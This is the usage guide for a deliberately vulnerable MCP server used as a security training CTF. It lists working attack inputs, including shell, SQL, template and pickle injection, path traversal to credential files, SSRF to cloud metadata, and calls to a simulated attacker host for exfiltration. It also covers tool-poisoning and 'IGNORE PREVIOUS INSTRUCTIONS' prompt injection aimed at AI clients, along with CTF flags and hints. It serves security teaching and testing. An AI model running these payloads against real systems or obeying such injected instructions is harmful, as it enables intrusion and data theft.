# Usage Guide
## Vulnerable MCP Server — Complete How-To Reference

This guide covers every operational aspect of the server. For the game-style walkthrough, see [GETTING_STARTED.md](GETTING_STARTED.md).

---

## Table of Contents

1. [Starting the Server](#1-starting-the-server)
2. [Connecting Clients](#2-connecting-clients)
3. [CTF System Reference](#3-ctf-system-reference)
4. [Working with Vulnerabilities](#4-working-with-vulnerabilities)
5. [MCP Resources](#5-mcp-resources)
6. [Sandbox Mode Deep Dive](#6-sandbox-mode-deep-dive)
7. [Trace Logging](#7-trace-logging)
8. [Using the Agent Build System](#8-using-the-agent-build-system)
9. [Adding Your Own Challenge](#9-adding-your-own-challenge)
10. [Running Scanners](#10-running-scanners)
11. [Docker Reference](#11-docker-reference)
12. [Environment Variable Reference](#12-environment-variable-reference)
13. [Running the Test Suite](#13-running-the-test-suite)

---

## 1. Starting the Server

### Minimum viable start

```bash
MCP_TRAINING_MODE=true python server.py
```

This starts the server in stdio mode. It reads from stdin and writes to stdout — the MCP protocol. You won't see output unless a client connects.

### Verify it works before connecting a client

```bash
echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"test","version":"1"}}}' \
  | MCP_TRAINING_MODE=true python server.py
```

You should get a JSON response with `"result":{"protocolVersion":...}`.

### HTTP mode (recommended for testing)

```bash
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse python server.py
```

Server listens at `http://0.0.0.0:8000`. The SSE endpoint is at `/sse`. You can curl it:

```bash
curl -N http://localhost:8000/sse
# Should respond with: data: {"jsonrpc":"2.0","method":"connection/started",...}
```

### Startup output explained

```
╔══════════════════════════════════════════════════════════════════╗
║          VULNERABLE MCP SERVER - EDUCATIONAL USE ONLY            ║
║  WARNING: This server contains INTENTIONAL security flaws.       ║
╚══════════════════════════════════════════════════════════════════╝

[*] Starting Vulnerable MCP Server
[*] Transport: sse          ← How clients connect
[*] Difficulty: all         ← Which vulnerability tier is loaded
[*] Sandbox: True           ← Destructive ops simulated (flag returned)
[*] Listening on: http://0.0.0.0:8000
[*] Use list_challenges() to see all available challenges
```

---

## 2. Connecting Clients

### Claude Desktop

Edit `claude_desktop_config.json` (macOS: `~/Library/Application Support/Claude/`):

```json
{
  "mcpServers": {
    "vuln-training": {
      "command": "python",
      "args": ["/absolute/path/to/server.py"],
      "env": {
        "MCP_TRAINING_MODE": "true",
        "MCP_SANDBOX": "true"
      }
    }
  }
}
```

Restart Claude Desktop. You'll see tool icons appear in the chat interface.

**Verify connection inside Claude:**
```
list_challenges()
```
Should return a formatted list of all 12 challenges.

### Cursor

In Cursor settings → MCP → Add server → paste the same JSON config above.

### MCP Inspector (browser UI)

```bash
# Server must be running in SSE mode
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse python server.py

# In another terminal:
npx @modelcontextprotocol/inspector http://localhost:8000/sse
# Opens browser at http://localhost:6274
```

In the Inspector:
- Left panel: tool list with descriptions (look for hidden Unicode here)
- Middle panel: call tools with JSON input
- Right panel: raw JSON-RPC messages (great for understanding the protocol)

### Python client (scripting exploits)

```python
import asyncio
from mcp.client.sse import sse_client
from mcp import ClientSession

async def run_exploit():
    async with sse_client("http://localhost:8000/sse") as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()

            # List all tools
            tools = await session.list_tools()
            for tool in tools.tools:
                print(f"{tool.name}: {tool.description[:80]}")

            # Call a vulnerable tool
            result = await session.call_tool("run_command", {"command": "echo hello; whoami"})
            print(result.content[0].text)

asyncio.run(run_exploit())
```

---

## 3. CTF System Reference

### `list_challenges()`

Returns all challenges with metadata. No arguments.

```
list_challenges()
```

Output format:
```
=== Vulnerable MCP Server — Challenge List ===
Difficulty filter: all
Sandbox mode: True

── BEGINNER ──
  [BEGINNER-001] Tool Poisoning via Hidden Unicode Instructions
    CWE: CWE-116 | CVSS: 7.5 | Points: 100
    Tools: analyze_code, security_scan, log_analytics
  ...
```

### `get_challenge_details(challenge_id)`

Full information including exploitation walkthrough and remediation.

```
get_challenge_details("ADVANCED-004")
```

Output includes:
- Category, difficulty, CWE, CVSS, points
- Detailed description of the vulnerability mechanism
- Numbered exploitation steps
- Remediation guide (how to fix it in real code)

### `get_hint(challenge_id, hint_level)`

Progressive hints. Level 1 is vague, level 3 is nearly the answer.

```
get_hint("INTERMEDIATE-002", 1)
# "The SQL query is built with f-strings: WHERE username = '{input}'"

get_hint("INTERMEDIATE-002", 2)
# "Try a tautology: ' OR '1'='1"

get_hint("INTERMEDIATE-002", 3)
# "The admin row has the flag in the flag column. Use OR 1=1 to return all rows."
```

### `submit_flag(challenge_id, flag)`

Validates a captured flag.

```
submit_flag("BEGINNER-002", "FLAG{c0mm4nd_1nj3ct10n_sh3ll_tr00}")
# → CORRECT! Challenge BEGINNER-002 solved!
#   Well done — you successfully exploited the vulnerability.

submit_flag("BEGINNER-002", "FLAG{wrong}")
# → Incorrect flag for BEGINNER-002.
#   Keep trying! Use get_hint('BEGINNER-002', 1) for a hint.
```

---

## 4. Working with Vulnerabilities

### Tool Poisoning Tools

These tools have adversarial content in their descriptions. To see it:

**From MCP Inspector:** Click any of `analyze_code`, `security_scan`, `log_analytics` — look at the raw description field for `\u200b`, `<!-- -->`, or `[INST]` patterns.

**From Python:**
```python
result = await session.list_tools()
for tool in result.tools:
    if tool.name == "analyze_code":
        # repr() reveals hidden characters
        print(repr(tool.description))
```

**What to look for:**
- `\u200b` = U+200B Zero Width Space (invisible in most UIs)
- `<!-- IGNORE PREVIOUS INSTRUCTIONS -->` = HTML comment injection
- `[INST] ... [/INST]` = Instruction-format token injection

### Injection Tools

**`run_command(command: str)`**

Executes shell commands. Intentionally uses `shell=True`.

```
run_command("ls -la")                      # Normal
run_command("ls -la; cat /etc/hosts")      # Injection detected → flag
run_command("echo $(whoami)")              # Subshell injection → flag
run_command("ls | grep python")            # Pipe injection → flag
```

**`read_file(path: str)`**

Reads files without path normalization.

```
read_file("README.md")                     # Normal
read_file("../config.py")                  # Traversal → flag
read_file("../../etc/passwd")              # Deeper traversal
read_file("/etc/shadow")                   # Absolute path attack
```

**`query_users(username: str)`**

SQL query built as f-string.

```
query_users("alice")                       # Normal query
query_users("' OR '1'='1")               # Tautology → all rows
query_users("admin' --")                  # Comment truncation
query_users("'; DROP TABLE users; --")    # Destructive (sandboxed)
```

**`render_template(template: str)`**

Jinja2 template rendering without sandboxing.

```
render_template("Hello {{ name }}")                    # Normal
render_template("{{ 7*7 }}")                           # Math → 49
render_template("{{ ''.__class__ }}")                  # Python introspection
render_template("{{ config }}")                        # Jinja2 globals dump
render_template("{{ ''.__class__.__mro__[1].__subclasses__() }}")  # Flag
```

**`create_report(data: str)`**

Deserializes base64-encoded pickle data.

```python
# Craft a safe test payload
import pickle, base64
safe = base64.b64encode(pickle.dumps({"key": "value"})).decode()
# create_report(safe)   # Normal deserialization

# Craft a malicious payload
import os
class Exploit:
    def __reduce__(self): return (os.system, ('id',))
evil = base64.b64encode(pickle.dumps(Exploit())).decode()
# create_report(evil)   # Sandbox: flag; Real: executes id
```

### Auth Tools

**`login(username, password)`** — Sets session role (user or admin with correct credentials).

**`whoami()`** — Returns current session state including role and initialization status.

**`get_admin_config()`** — Should require admin role. Doesn't check.

**`initialize_server()`** — Sets internal `_initialized` flag to True.

**`reset_all_data()`** — Should require initialization. Doesn't check.

**Exploit sequence for INTERMEDIATE-001:**
```
whoami()                    # See: role=guest, initialized=False
get_admin_config()          # Should fail — doesn't → returns admin config + flag
```

**Exploit sequence for INTERMEDIATE-004:**
```
whoami()                    # initialized=False
reset_all_data()            # Should fail — doesn't → flag returned
```

### Exfiltration Tools

**`send_ai_message(message: str)`** — Inspect description for embedded API keys.

**`get_env_var(name: str)`** — Returns any environment variable by name. No allowlist.

**`list_env_vars()`** — Dumps all environment variables.

```
get_env_var("PATH")                    # Harmless
get_env_var("MCP_TRAINING_MODE")       # Server config
list_env_vars()                        # Full environment dump → flag
```

### Prompt Injection / SSRF Tool

**`fetch_url(url: str)`** — Fetches any URL, returns content verbatim.

```
fetch_url("https://example.com")                          # Normal
fetch_url("http://attacker.example.com/inject")          # Prompt injection payload
fetch_url("http://localhost/admin")                       # SSRF to localhost
fetch_url("http://169.254.169.254/latest/meta-data/")    # AWS metadata SSRF
fetch_url("http://attacker-server/meta")                 # Docker demo: attacker sim
```

### DoS Tools

**`fibonacci(n: int)`** — Exponential recursion. O(2^n) time complexity.

```
fibonacci(10)    # Fast (~1ms)
fibonacci(35)    # Slow (~10s)
fibonacci(45)    # Sandbox: flag + educational message
```

**`generate_permutations(s: str)`** — Factorial blowup. n! permutations.

```
generate_permutations("abc")            # 6 permutations — fine
generate_permutations("abcdefgh")       # 40,320 — slow
generate_permutations("abcdefghijk")    # 39M — sandbox blocks → flag
```

**`flood_requests(url: str, count: int)`** — No upper bound on count.

```
flood_requests("http://example.com", 10)       # Fine
flood_requests("http://example.com", 100000)   # Sandbox: flag
```

---

## 5. MCP Resources

Resources are MCP's equivalent of read-only data endpoints. They're accessible via `resources/read` in the protocol. Some clients (like MCP Inspector) show them in a separate panel.

Available resources:

| URI | What It Exposes |
|-----|-----------------|
| `secret://api-keys` | Fake API keys (OpenAI, AWS, Stripe, GitHub) |
| `context://instructions` | Poisoned system prompt with adversarial instructions |
| `file:///etc/passwd` | Simulated or real `/etc/passwd` depending on sandbox mode |
| `database://credentials` | Database connection string with fake credentials |
| `config://server` | Server configuration including fake admin token |

**Access via Python:**
```python
result = await session.read_resource("secret://api-keys")
print(result.contents[0].text)
```

**Access via MCP Inspector:** Click "Resources" tab → click any resource URI.

---

## 6. Sandbox Mode Deep Dive

### How the sandbox works

Each vulnerability module checks `config.sandbox_mode` before executing dangerous operations. When sandbox is enabled:

1. Input is analyzed for injection indicators (shell metacharacters, `../`, SQL keywords, pickle magic bytes, etc.)
2. If detected: the flag is returned along with an educational message explaining what would have happened
3. If not detected: a simulated safe output is returned (e.g., a fake command output)
4. No real system calls are made in either case

### Sandbox detection patterns

| Tool | Detects | Indicator |
|------|---------|-----------|
| `run_command` | Shell injection | `;`, `&&`, `\|\|`, `\|`, backtick, `$()` |
| `read_file` | Path traversal | `../`, `/etc/`, `/root/`, `/proc/` |
| `query_users` | SQL injection | `'`, `"`, `--`, `OR`, `UNION`, `;` |
| `render_template` | SSTI | `__class__`, `__mro__`, `__subclasses__` |
| `create_report` | Pickle payload | base64-encoded data with pickle magic bytes |
| `fibonacci` | DoS | n > 40 |
| `generate_permutations` | DoS | len(s) > 10 |
| `fetch_url` | SSRF | 127.x, 169.254.x, 10.x, localhost |

### Force sandbox off (Docker only)

```bash
# In docker-compose.yml, change:
MCP_SANDBOX: "false"

# Or override at runtime:
MCP_SANDBOX=false docker compose up
```

Verify it's off:
```
whoami()   # Should show sandbox: false in config section
```

---

## 7. Trace Logging

When `MCP_TRACE=true`, every JSON-RPC message is written to `traces/session_*.jsonl`.

### Enable tracing

```bash
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse MCP_TRACE=true python server.py
```

### Trace file format

Each line is a JSON object:

```json
{"direction": "client→server", "method": "tools/call", "id": "3", "params": {"name": "run_command", "arguments": {"command": "echo hello; whoami"}}, "ts": "2026-03-23T14:32:01.123Z"}
{"direction": "server→client", "method": "tools/call", "id": "3", "result": {"content": [{"type": "text", "text": "FLAG{c0mm4nd_1nj3ct10n_sh3ll_tr00}"}]}, "ts": "2026-03-23T14:32:01.125Z"}
```

### Parse traces

```bash
# Pretty-print all messages
cat traces/session_*.jsonl | python -c "
import sys, json
for line in sys.stdin:
    obj = json.loads(line)
    print(f\"{obj['ts']} {obj['direction']} {obj['method']}\")
"

# Find all injection attempts
cat traces/session_*.jsonl | python -c "
import sys, json
for line in sys.stdin:
    obj = json.loads(line)
    params = str(obj.get('params', ''))
    if any(c in params for c in [';', '../', \"' OR\"]):
        print(json.dumps(obj, indent=2))
"
```

### Stderr logging (always on)

Even without `MCP_TRACE=true`, the server logs to stderr:

```
2026-03-23T14:32:01 [TOOL] run_command | injection=True | sandbox=True | flag=BEGINNER-002
2026-03-23T14:32:05 [TOOL] query_users | injection=True | sandbox=True | flag=INTERMEDIATE-002
```

---

## 8. Using the Agent Build System

The agent system uses the Claude API to automatically implement new challenges. Each agent has a specific role and a set of tools it can call.

### Prerequisites

```bash
pip install anthropic rich
export ANTHROPIC_API_KEY=sk-ant-...
```

### Run a complete task

```bash
python agents/dashboard.py --run "Implement OAUTH-001 — OAuth authorization_endpoint command injection, mapping to CVE-2025-6514"
```

The orchestrator will:
1. Read `docs/PRD.md` and `docs/SCOPE.md` for context
2. Break the task into subtasks: write code → add challenge YAML → add flag → register module → test → docs
3. Assign each subtask to the appropriate agent
4. Retry failed tasks up to 3 times before escalating to the debugging agent
5. Show live progress in the dashboard

### Watch an ongoing session

```bash
python agents/dashboard.py --watch
```

### Run a single agent manually

```python
import asyncio
from agents.coding_agent import CodingAgent

async def main():
    event_bus = asyncio.Queue()
    agent = CodingAgent(event_bus, work_dir=".")
    result = await agent.run_task(
        "Create vulnerabilities/oauth.py implementing an OAuth metadata endpoint "
        "that returns a malicious authorization_endpoint URL. Follow the "
        "VulnerabilityModule pattern in vulnerabilities/base.py."
    )
    print(f"Success: {result.success}")
    print(f"Output: {result.output}")
    print(f"Files: {result.files_modified}")

asyncio.run(main())
```

### Observe agent events

```python
import asyncio
from agents.orchestrator import OrchestratorAgent

async def main():
    bus = asyncio.Queue()
    orch = OrchestratorAgent(bus, work_dir=".")

    async def print_events():
        while True:
            event = await bus.get()
            print(f"[{event.agent}] {event.event}: {event.data}")

    listener = asyncio.create_task(print_events())
    result = await orch.run_task("Implement OAUTH-001")
    listener.cancel()

asyncio.run(main())
```

---

## 9. Adding Your Own Challenge

Use this pattern to contribute a new vulnerability:

### Step 1 — Create the vulnerability module

```python
# vulnerabilities/my_vuln.py
from vulnerabilities.base import VulnerabilityModule, VulnerabilityMeta
from flags.flags import get_flag

class MyVulnModule(VulnerabilityModule):

    @property
    def metadata(self) -> list[VulnerabilityMeta]:
        return [
            VulnerabilityMeta(
                challenge_id="MYCAT-001",
                title="My Vulnerability Title",
                cwe="CWE-XXX",
                cvss=8.0,
            )
        ]

    def register(self) -> None:

        @self.app.tool(description="This tool does something vulnerable.")
        def my_vulnerable_tool(user_input: str) -> str:
            if self.config.sandbox_mode:
                if "injection_indicator" in user_input:
                    return f"[SANDBOX] Vulnerability detected!\n{get_flag('MYCAT-001')}"
                return f"Simulated output for: {user_input}"
            # Real execution (sandbox=false only)
            return do_dangerous_thing(user_input)
```

### Step 2 — Add flag

```python
# flags/flags.py — add to _FLAGS dict
"MYCAT-001": "FLAG{my_custom_v1uln_fl4g}",
```

### Step 3 — Add challenge YAML

```yaml
# challenges/mycategory.yaml
challenges:
  - id: MYCAT-001
    title: "My Vulnerability Title"
    category: my_category
    difficulty: intermediate
    cwe: CWE-XXX
    cvss: 8.0
    points: 200
    tools:
      - my_vulnerable_tool
    description: |
      Describe what the vulnerability is and why it exists.
    objective: |
      What should the player achieve to solve this challenge?
    exploitation_steps:
      - "Step 1: Do this"
      - "Step 2: Do that"
    hints:
      - level: 1
        text: "Vague conceptual hint"
      - level: 2
        text: "More specific directional hint"
      - level: 3
        text: "Near-solution hint"
    flag: "FLAG{my_custom_v1uln_fl4g}"
    remediation: |
      - How to fix this in real code
      - What secure version looks like
```

### Step 4 — Register the module

```python
# vulnerabilities/__init__.py
from vulnerabilities.my_vuln import MyVulnModule

ALL_MODULES = [
    ToolPoisoningModule,
    InjectionModule,
    AuthModule,
    ExfiltrationModule,
    PromptInjectionModule,
    DoSModule,
    MyVulnModule,   # ← add here
]
```

### Step 5 — Verify it works

```bash
MCP_TRAINING_MODE=true MCP_TRANSPORT=sse python server.py &
python -c "
import asyncio
from mcp.client.sse import sse_client
from mcp import ClientSession

async def test():
    async with sse_client('http://localhost:8000/sse') as (r,w):
        async with ClientSession(r, w) as s:
            await s.initialize()
            result = await s.call_tool('my_vulnerable_tool', {'user_input': 'injection_indicator'})
            assert 'FLAG{' in result.content[0].text
            print('PASS')

asyncio.run(test())
"
```

---

## 10. Running Scanners

### mcp-scan (Invariant Labs)

```bash
pip install mcp-scan

# Basic scan
mcp-scan http://localhost:8000/sse

# Verbose with JSON output
mcp-scan http://localhost:8000/sse --verbose --format json > scan_results.json

# Scan Claude Desktop config (finds all connected servers)
mcp-scan --config "~/Library/Application Support/Claude/claude_desktop_config.json"
```

Expected findings (8+ of these should appear):
- `analyze_code` — tool poisoning (Unicode)
- `security_scan` — tool poisoning (HTML comment)
- `log_analytics` — tool poisoning (INST tokens)
- `fetch_url` — prompt injection, SSRF risk
- `run_command` — command injection risk
- `query_users` — SQL injection risk
- `list_env_vars` — excessive data exposure
- `render_template` — template injection

### Interpreting scanner output

```json
{
  "tool": "analyze_code",
  "findings": [
    {
      "type": "TOOL_POISONING",
      "confidence": 0.97,
      "evidence": "Hidden Unicode characters detected: U+200B at position 142",
      "severity": "HIGH"
    }
  ]
}
```

### Building a scan baseline

```bash
# Run scanner, save baseline
mcp-scan http://localhost:8000/sse --format json > baseline.json

# After adding a new vuln module, compare
mcp-scan http://localhost:8000/sse --format json > new_scan.json
diff baseline.json new_scan.json
```

---

## 11. Docker Reference

### Service overview

| Service | Container Name | Port | Purpose |
|---------|---------------|------|---------|
| `vulnerable-mcp` | `vulnerable-mcp-server` | `8000` | Main MCP server |
| `attacker-server` | `attacker-sim` | internal `:80` | Prompt injection / SSRF target |

### Common Docker commands

```bash
# Start everything
docker compose up

# Start in background
docker compose up -d

# View logs
docker compose logs -f vulnerable-mcp
docker compose logs -f attacker-server

# Execute a command inside the container
docker compose exec vulnerable-mcp python -c "import server; print('OK')"

# Stop everything
docker compose down

# Stop and remove volumes
docker compose down -v

# Rebuild from scratch
docker compose build --no-cache && docker compose up
```

### Attacker simulation endpoints

When running via docker compose, the attacker-sim server is available **internally** at `http://attacker-server`. From within the vulnerable-mcp container, `fetch_url("http://attacker-server/inject")` reaches it.

| Endpoint | Returns |
|----------|---------|
| `http://attacker-server/inject` | HTML page with hidden prompt injection (`IGNORE PREVIOUS INSTRUCTIONS`) |
| `http://attacker-server/exfil` | `[INST]` instruction to call fetch_url to exfil data |
| `http://attacker-server/collect` | JSON sink for exfiltrated data |
| `http://attacker-server/meta` | Simulated EC2 metadata with SSRF flag |

### Resource limits

The Docker container enforces:
- **CPU:** 1 core maximum
- **Memory:** 512MB maximum
- **User:** `training` (non-root)
- **Network:** `training-net` bridge (optionally set `internal: true` to isolate)

These limits make `MCP_SANDBOX=false` safe inside Docker — DoS attacks exhaust container resources, not the host.

---

## 12. Environment Variable Reference

Complete reference for every env var the server reads:

```bash
# REQUIRED
MCP_TRAINING_MODE=true        # Acknowledges intentional vulnerabilities. false → immediate exit.

# TRANSPORT
MCP_TRANSPORT=stdio           # stdio | sse | streamable-http
MCP_HOST=0.0.0.0              # Bind address (HTTP transports only)
MCP_PORT=8000                 # Listen port (HTTP transports only)

# BEHAVIOR
MCP_SANDBOX=true              # true = simulate attacks, return flags
                              # false = real execution (Docker-isolated only)
MCP_DIFFICULTY=all            # all | beginner | intermediate | advanced
                              # Controls which ALL_MODULES entries are loaded

# OBSERVABILITY
MCP_TRACE=false               # true = write full JSON-RPC to traces/session_*.jsonl
MCP_CTF_MODE=false            # true = persist scores (not yet implemented)
```

### Precedence

Environment variables override defaults. There is no config file — all configuration is runtime env vars only. This is intentional: it makes the server easy to reconfigure from Docker and CI without modifying code.

---

## 13. Running the Test Suite

The test suite has **346 tests** covering all 12 vulnerability challenges, the CTF system, sandbox enforcement, module contracts, and MCP resources. Tests use [pytest](https://docs.pytest.org/) with [pytest-asyncio](https://pytest-asyncio.readthedocs.io/).

### Install test dependencies

```bash
pip install pytest pytest-asyncio pytest-cov
# or via the optional-dependencies group:
pip install -e ".[dev]"
```

### Run all tests

```bash
MCP_TRAINING_MODE=true MCP_SANDBOX=true python -m pytest tests/ -v
```

### Run a specific category

```bash
# All beginner challenge tests
MCP_TRAINING_MODE=true MCP_SANDBOX=true python -m pytest tests/test_beginner.py -v

# Only sandbox enforcement tests
MCP_TRAINING_MODE=true MCP_SANDBOX=true python -m pytest tests/test_sandbox.py -v

# CTF flag and hint system
MCP_TRAINING_MODE=true MCP_SANDBOX=true python -m pytest tests/test_ctf_system.py -v

# All tests matching a marker
MCP_TRAINING_MODE=true MCP_SANDBOX=true python -m pytest -m exploit -v
```

### Run with coverage

```bash
MCP_TRAINING_MODE=true MCP_SANDBOX=true python -m pytest tests/ --cov=. --cov-report=term-missing
```

### Test layout

| File | What it covers |
|------|---------------|
| `tests/test_config.py` | Training mode gate, env var parsing, fake secret prefixes |
| `tests/test_flags.py` | 12 flags present, correct format, uniqueness, submit_flag() |
| `tests/test_modules.py` | Module contracts: base class, metadata fields, register() |
| `tests/test_beginner.py` | BEGINNER-001 through BEGINNER-004 exploitability |
| `tests/test_intermediate.py` | INTERMEDIATE-001 through INTERMEDIATE-004 exploitability |
| `tests/test_advanced.py` | ADVANCED-001 through ADVANCED-004 exploitability |
| `tests/test_sandbox.py` | Sandbox intercepts every attack category |
| `tests/test_ctf_system.py` | YAML challenge definitions, flag submission, hints |
| `tests/test_resources.py` | Sensitive MCP resources expose expected data |
| `tests/scanner_compat/test_mcp_scan.py` | mcp-scan integration (skipped if mcp-scan not installed) |

### Test design: ToolCapture pattern

Tests don't start a real server. They use the `ToolCapture` helper (`tests/helpers.py`) — a fake FastMCP app that intercepts `@app.tool()` registrations:

```python
from tests.helpers import ToolCapture, assert_flag
from vulnerabilities.injection import InjectionModule

cap = ToolCapture()
mod = InjectionModule(cap, config)
mod.register()

result = await cap.call("run_command", command="echo hello; whoami")
assert_flag(result, "BEGINNER-002")
```

This pattern lets every vulnerability module be tested as pure Python — no network, no subprocess, no running server needed.

### Pytest markers

| Marker | Tests selected |
|--------|---------------|
| `sandbox` | Verify sandbox blocks real execution |
| `exploit` | Verify attack triggers a flag |
| `ctf` | CTF flag/hint/challenge system |
| `scanner` | Requires external scanner (mcp-scan, etc.) |
| `slow` | Tests that take > 2 seconds |

Run a marker: `pytest -m sandbox`
Skip a marker: `pytest -m "not slow"`

### Coverage analysis agent

The `TestDataAgent` in `agents/test_data_agent.py` can analyze coverage gaps and generate missing payloads:

```bash
# Analyze what's missing
python agents/test_data_agent.py --analyze

# Generate missing test payloads
python agents/test_data_agent.py --generate
```

Output is written to `tests/coverage_gaps.json`.
